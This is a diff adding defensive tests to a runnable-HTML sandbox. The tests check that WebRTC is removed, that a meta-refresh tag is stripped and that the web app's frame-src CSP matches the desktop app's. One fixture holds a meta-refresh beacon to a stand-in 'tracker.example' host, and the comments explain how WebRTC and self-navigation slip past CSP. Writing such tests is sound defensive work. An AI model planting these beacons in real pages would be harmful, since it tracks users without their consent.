@@ -60,6 +60,24 @@ function runShim(make: {
   return { win, doc };
 }
 
+describe("runnable html prelude", () => {
+  // CSP does not govern WebRTC: an ICE candidate to a STUN host of the
+  // document's choosing would reach the network with nothing approved.
+  test("removes WebRTC before the document's scripts run", () => {
+    const storage = { getItem: () => null };
+    const win: Record<string, unknown> = {
+      localStorage: storage,
+      sessionStorage: storage,
+      RTCPeerConnection: function RTCPeerConnection() {},
+      webkitRTCPeerConnection: function webkitRTCPeerConnection() {},
+    };
+    new Function("window", "document", STORAGE_SHIM)(win, { cookie: "" });
+
+    expect(win.RTCPeerConnection).toBeUndefined();
+    expect(win.webkitRTCPeerConnection).toBeUndefined();
+  });
+});
+
 describe("runnable html storage shim", () => {
   test("injects the shim ahead of the host bridge and user scripts", () => {
     const { html } = buildRunnableHtml(
@@ -438,5 +456,28 @@ describe("approved remote origins", () => {
     expect(csp).toContain("connect-src 'none'");
     // The scan itself is approval-independent.
     expect(second.remoteDependencies).toEqual(first.remoteDependencies);
+  });
+
+  // No CSP directive stops a frame navigating itself (navigate-to never
+  // shipped), and a refresh beacons the open without running any script.
+  test("drops meta refresh so the document cannot navigate itself away", () => {
+    const { html } = buildRunnableHtml(
+      '<head><meta http-equiv=" Refresh " content="0; url=https://tracker.example/?opened=1"></head><p>x</p>',
+    );
+
+    expect(html).not.toContain("tracker.example");
+  });
+
+  // Static check: only the embedding page's frame-src stops script in the
+  // run frame from navigating it (location.href = …) to beacon the open.
+  // The desktop CSP has it; the web app must send the same directive.
+  test("the web app ships the desktop app's frame-src", async () => {
+    const root = new URL("../../", import.meta.url);
+    const conf = await Bun.file(new URL("src-tauri/tauri.conf.json", root)).json();
+    const headers = await Bun.file(new URL("public/_headers", root)).text();
+    const frameSrc = /frame-src [^;]*/.exec(String(conf.app.security.csp))?.[0];
+
+    expect(frameSrc).toBe("frame-src 'self' blob:");
+    expect(headers).toMatch(/^\/\*\n(?:[ \t]+.*\n)*?[ \t]+Content-Security-Policy: frame-src 'self' blob:\s*$/m);
   });
 });
